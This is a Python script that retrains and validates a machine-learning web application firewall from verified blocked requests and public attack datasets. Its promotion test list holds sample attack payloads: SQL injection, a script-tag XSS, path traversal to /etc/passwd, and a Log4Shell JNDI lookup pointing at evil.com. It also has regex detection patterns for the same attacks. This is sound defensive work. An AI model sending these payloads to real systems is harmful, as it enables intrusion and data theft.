import sqlite3
import pandas as pd
import numpy as np
import joblib
import os
import re
import onnxruntime as rt
from scipy.stats import entropy
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.preprocessing import StandardScaler
from sklearn.ensemble import RandomForestClassifier
from scipy.sparse import hstack
from skl2onnx import convert_sklearn
from skl2onnx.common.data_types import FloatTensorType

print("=== WAF Self-Healing Pipeline Initiated ===")

FEEDBACK_BOOST_FACTOR = 100
VERIFIED_STATUSES = (
    "VERIFIED_NORMAL",
    "VERIFIED_ATTACK",
    "TRAINED_NORMAL",
    "TRAINED_ATTACK",
)
MODELS_DIR = os.path.join(os.path.dirname(__file__), "..", "models")
LIVE_ARTIFACTS = {
    "vectorizer": os.path.join(MODELS_DIR, "tfidf_vectorizer_v2.pkl"),
    "scaler": os.path.join(MODELS_DIR, "standard_scaler_v2.pkl"),
    "model": os.path.join(MODELS_DIR, "waf_brain_v2.onnx"),
}
CANDIDATE_ARTIFACTS = {
    "vectorizer": os.path.join(MODELS_DIR, "candidate_tfidf_vectorizer_v2.pkl"),
    "scaler": os.path.join(MODELS_DIR, "candidate_standard_scaler_v2.pkl"),
    "model": os.path.join(MODELS_DIR, "candidate_waf_brain_v2.onnx"),
}
PROMOTION_NORMALS = [
    "http://localhost:8080/tienda1/imagenes/nuevo_logo.png",
    "http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1",
    "GET http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1\n",
    "http://localhost:8080/tienda1/index.jsp HTTP/1.1",
    "http://localhost:8080/tienda1/publico/carrito.jsp?checkout=true HTTP/1.1",
]
PROMOTION_ATTACKS = [
    "http://localhost:8080/login?user=admin' OR 1=1 --&pwd=x HTTP/1.1",
    "http://localhost:8080/search?q=<script>alert('XSS')</script> HTTP/1.1",
    "http://localhost:8080/tienda1/publico/../../../../etc/passwd HTTP/1.1",
    "http://localhost:8080/api?token=${jndi:ldap://evil.com/exploit} HTTP/1.1",
]

# --- 1. Utility Functions (Must match exactly) ---
from collections import Counter
import math

def calculate_scipy_entropy(text):
    if not text: return 0.0
    counts = Counter(text)
    length = len(text)
    ent = 0.0
    for count in counts.values():
        p = count / length
        ent -= p * math.log2(p)
    return ent

def sql_keyword_count(text):
    if not text: return 0
    pattern = r'\b(SELECT|UNION|DROP|INSERT|UPDATE|DELETE|OR|AND|FROM|WHERE|EXEC|CAST|CHAR|DECLARE)\b'
    return len(re.findall(pattern, text, re.IGNORECASE))

def digit_ratio(text):
    if not text: return 0.0
    return sum(c.isdigit() for c in text) / len(text)

def uppercase_ratio(text):
    if not text: return 0.0
    letters = [c for c in text if c.isalpha()]
    return sum(c.isupper() for c in letters) / len(letters) if letters else 0.0

def has_attack_signature(text):
    if not text:
        return False
    patterns = [
        r"(?i)(?:^|[^a-z])or[^a-z]+['\"]?\d+['\"]?\s*=\s*['\"]?\d+",
        r"(?i)union\s+select",
        r"(?i)drop\s+table",
        r"(?i)insert\s+into",
        r"(?i)<\s*script",
        r"(?i)\$\{\s*jndi\s*:",
        r"(?i)(?:\.\./|%2e%2e%2f)",
        r"(?i)/etc/passwd",
    ]
    return any(re.search(pattern, text) for pattern in patterns)

def build_feature_row(raw_request, vectorizer, scaler):
    numeric = pd.DataFrame([{
        'length': len(raw_request),
        'entropy': calculate_scipy_entropy(raw_request),
        'sql_kw_count': sql_keyword_count(raw_request),
        'digit_ratio': digit_ratio(raw_request),
        'uppercase_ratio': uppercase_ratio(raw_request),
    }])
    return hstack([
        scaler.transform(numeric),
        vectorizer.transform([raw_request]),
    ]).toarray().astype(np.float32)

def validate_candidate(vectorizer, scaler, model_path):
    session = rt.InferenceSession(model_path, providers=['CPUExecutionProvider'])
    input_name = session.get_inputs()[0].name
    output_names = [output.name for output in session.get_outputs()]
    failures = []

    for payload in PROMOTION_NORMALS:
        features = build_feature_row(payload, vectorizer, scaler)
        outputs = session.run(output_names, {input_name: features})
        pred = int(outputs[0][0])
        if pred != 0:
            failures.append(f"normal failed: {payload}")

    for payload in PROMOTION_ATTACKS:
        features = build_feature_row(payload, vectorizer, scaler)
        outputs = session.run(output_names, {input_name: features})
        pred = int(outputs[0][0])
        if pred != 1:
            failures.append(f"attack failed: {payload}")

    return failures

def promote_candidate():
    for path in LIVE_ARTIFACTS.values():
        backup_path = f"{path}.bak"
        if os.path.exists(path):
            if os.path.exists(backup_path):
                os.remove(backup_path)
            os.replace(path, backup_path)

    for key, candidate_path in CANDIDATE_ARTIFACTS.items():
        os.replace(candidate_path, LIVE_ARTIFACTS[key])

# --- 2. Extract Verified Logs from Database ---
print("Fetching newly verified threat intelligence...")
db_path = os.path.join(os.path.dirname(__file__), "..", "waf_quarantine.db")
conn = sqlite3.connect(db_path)
placeholders = ",".join("?" for _ in VERIFIED_STATUSES)
query = f"SELECT id, request_payload, status FROM blocked_requests WHERE status IN ({placeholders})"
new_data_df = pd.read_sql_query(query, conn, params=VERIFIED_STATUSES)

poisoned_normals = new_data_df[
    new_data_df["status"].isin(["VERIFIED_NORMAL", "TRAINED_NORMAL"])
    & new_data_df["request_payload"].apply(has_attack_signature)
]
if not poisoned_normals.empty:
    ids = [int(row_id) for row_id in poisoned_normals["id"]]
    print(f"Found {len(ids)} contradictory VERIFIED_NORMAL row(s) with attack signatures. Marking REVIEW_REQUIRED.")
    conn.executemany(
        "UPDATE blocked_requests SET status = 'REVIEW_REQUIRED' WHERE id = ?",
        [(row_id,) for row_id in ids],
    )
    conn.commit()
    new_data_df = new_data_df[~new_data_df["id"].isin(ids)]

conn.close()

if new_data_df.empty:
    print("No new verified logs found. Model is up to date. Exiting.")
    exit()

# Map the text statuses to integer labels
new_data_df['Type'] = np.where(new_data_df['status'].isin(['VERIFIED_ATTACK', 'TRAINED_ATTACK']), 1, 0)
new_data_df.rename(columns={'request_payload': 'full_request'}, inplace=True)
new_data_df.drop(columns=['id', 'status'], inplace=True)

print(f"Found {len(new_data_df)} new verified records. Injecting into baseline dataset...")

# --- 3. Multi-Source Data Engine ---
data_dir = os.path.join(os.path.dirname(__file__), "..", "data")
sources = []
TARGET_TOTAL_SIZE = 150000  # Smaller, more balanced dataset is better than huge imbalanced one

# 1. Load CSIC (Baseline Web Attacks) - 20%
csic_path = os.path.join(data_dir, "csic_augmented.csv")
if os.path.exists(csic_path):
    print("Loading CSIC Augmented (Base HTTP Vocabulary)...")
    df_csic = pd.read_csv(csic_path)
    df_csic['classification'] = df_csic['classification'].astype(str)
    df_csic['Type'] = np.where(df_csic['classification'].isin(['0', 'augmented_normal']), 0, 1)
    df_csic['full_request'] = df_csic['URL'].fillna('') + df_csic['content'].fillna('')
    sources.append(df_csic[['full_request', 'Type']].sample(n=30000, replace=True, random_state=42))

# 2. Source A: CSE-CIC-IDS2018 (Network Behavior) - 45% (to reach 65% non-juice)
cic_path = os.path.join(data_dir, "cic_ids_2018.csv")
if os.path.exists(cic_path):
    print("Loading CSE-CIC-IDS2018 (Behavioral)...")
    df_cic = pd.read_csv(cic_path)
    port_col = 'Dst Port' if 'Dst Port' in df_cic.columns else 'Destination Port'
    df_cic['Type'] = np.where(df_cic['Label'] == 'Benign', 0, 1)
    df_cic['full_request'] = (
        "NETFLOW port:" + df_cic[port_col].astype(str) + 
        " proto:" + df_cic['Protocol'].astype(str) + 
        " bytes:" + df_cic.get('TotLen Fwd Pkts', df_cic.get('Total Length of Fwd Packets', 0)).astype(str)
    )
    sources.append(df_cic[['full_request', 'Type']].sample(n=67500, replace=True, random_state=42))

# 3. Source B: OWASP Juice Shop Logs (Modern API) - 35%
juice_path = os.path.join(data_dir, "juice_shop_attacks.csv")
if os.path.exists(juice_path):
    print("Loading OWASP Juice Shop (Modern Web)...")
    df_juice = pd.read_csv(juice_path)
    df_juice.rename(columns={'payload': 'full_request', 'is_attack': 'Type'}, inplace=True)
    sources.append(df_juice[['full_request', 'Type']].sample(n=52500, replace=True, random_state=42))

if not sources:
    print("Error: No training data found.")
    exit(1)

baseline_df = pd.concat(sources, ignore_index=True)
print(f"Aggregated balanced dataset: {baseline_df['Type'].value_counts().to_dict()}")

if not sources:
    print("Error: No training data found in 'data/' directory.")
    exit(1)

baseline_df = pd.concat(sources, ignore_index=True)
print(f"Aggregated baseline dataset size: {len(baseline_df)} rows.")

# Add a few boring static assets as stable anchors so the model does not overreact to image paths.
known_normal_df = pd.DataFrame({
    'full_request': [
        'http://localhost:8080/tienda1/imagenes/nuevo_logo.png',
        'http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1',
        'GET http://localhost:8080/tienda1/imagenes/nuevo_logo.png HTTP/1.1\n',
        'http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1',
        'http://localhost:8080/tienda1/publico/carrito.jsp?checkout=true',
        'http://localhost:8080/tienda1/publico/carrito.jsp?checkout=true HTTP/1.1',
        'http://localhost:8080/tienda1/publico/carrito.jsp?id=1 HTTP/1.1',
        'http://localhost:8080/tienda1/index.jsp HTTP/1.1',
    ],
    'Type': [0] * 8,
})
new_data_df = pd.concat([new_data_df, known_normal_df], ignore_index=True)

# Oversample feedback so a correction is visible immediately after one retrain.
# AND oversample the known anchors to force the decision boundary for common paths.
boosted_new_data = pd.concat([new_data_df] * FEEDBACK_BOOST_FACTOR, ignore_index=True)
combined_df = pd.concat([baseline_df, boosted_new_data], ignore_index=True)

# --- 4. Rebuild the Feature Matrix ---
print(f"Re-compiling feature extraction matrix for {len(combined_df)} rows...", flush=True)
print("  - Calculating length...", flush=True)
lengths = combined_df['full_request'].apply(len)
print("  - Calculating entropy...", flush=True)
entropies = combined_df['full_request'].apply(calculate_scipy_entropy)
print("  - Calculating SQL keywords...", flush=True)
sql_kws = combined_df['full_request'].apply(sql_keyword_count)
print("  - Calculating digit ratio...", flush=True)
digit_ratios = combined_df['full_request'].apply(digit_ratio)
print("  - Calculating uppercase ratio...", flush=True)
upper_ratios = combined_df['full_request'].apply(uppercase_ratio)

numeric_features = pd.DataFrame({
    'length': lengths,
    'entropy': entropies,
    'sql_kw_count': sql_kws,
    'digit_ratio': digit_ratios,
    'uppercase_ratio': upper_ratios
})

# Re-train Preprocessors on the entire new dataset
vectorizer = TfidfVectorizer(analyzer='char', ngram_range=(1, 3), max_features=1000)
scaler = StandardScaler()

X_tfidf = vectorizer.fit_transform(combined_df['full_request'])
X_num_scaled = scaler.fit_transform(numeric_features)
X_final = hstack([X_num_scaled, X_tfidf])
y = combined_df['Type']

# --- 5. Retrain the Brain ---
print("Training WAF Brain v2.0...", flush=True)
# Adjust class weights based on the actual distribution in combined_df
class_counts = combined_df['Type'].value_counts()
weight_0 = 1.0
weight_1 = class_counts[0] / class_counts[1] # Balance them equally
print(f"  - Class distribution: Normal={class_counts[0]}, Anomalous={class_counts[1]}")
print(f"  - Calculated weights: {{0: {weight_0}, 1: {round(weight_1, 4)}}}")

model = RandomForestClassifier(
    n_estimators=150, max_depth=25, min_samples_leaf=2,
    class_weight={0: weight_0, 1: weight_1}, random_state=42, n_jobs=-1
)
model.fit(X_final, y)

# --- 6. Export the Upgraded System ---
print("Exporting upgraded assets to 'models' directory...")
joblib.dump(vectorizer, CANDIDATE_ARTIFACTS["vectorizer"])
joblib.dump(scaler, CANDIDATE_ARTIFACTS["scaler"])

feature_count = X_final.shape[1]
initial_type = [('float_input', FloatTensorType([None, feature_count]))]
onnx_model = convert_sklearn(model, initial_types=initial_type)

with open(CANDIDATE_ARTIFACTS["model"], "wb") as f:
    f.write(onnx_model.SerializeToString())

print("Running promotion gate...")
failures = validate_candidate(vectorizer, scaler, CANDIDATE_ARTIFACTS["model"])
if failures:
    print("Promotion gate failed. Live model was not changed.")
    for failure in failures:
        print(f"  - {failure}")
    raise SystemExit(1)

promote_candidate()

db_path = os.path.join(os.path.dirname(__file__), "..", "waf_quarantine.db")
conn = sqlite3.connect(db_path)
conn.execute("UPDATE blocked_requests SET status = 'TRAINED_NORMAL' WHERE status = 'VERIFIED_NORMAL'")
conn.execute("UPDATE blocked_requests SET status = 'TRAINED_ATTACK' WHERE status = 'VERIFIED_ATTACK'")
conn.commit()
conn.close()

print("\nSuccess! Candidate passed the promotion gate and replaced the live v2 assets.")
print("The API will hot-reload the updated model on the next request.")
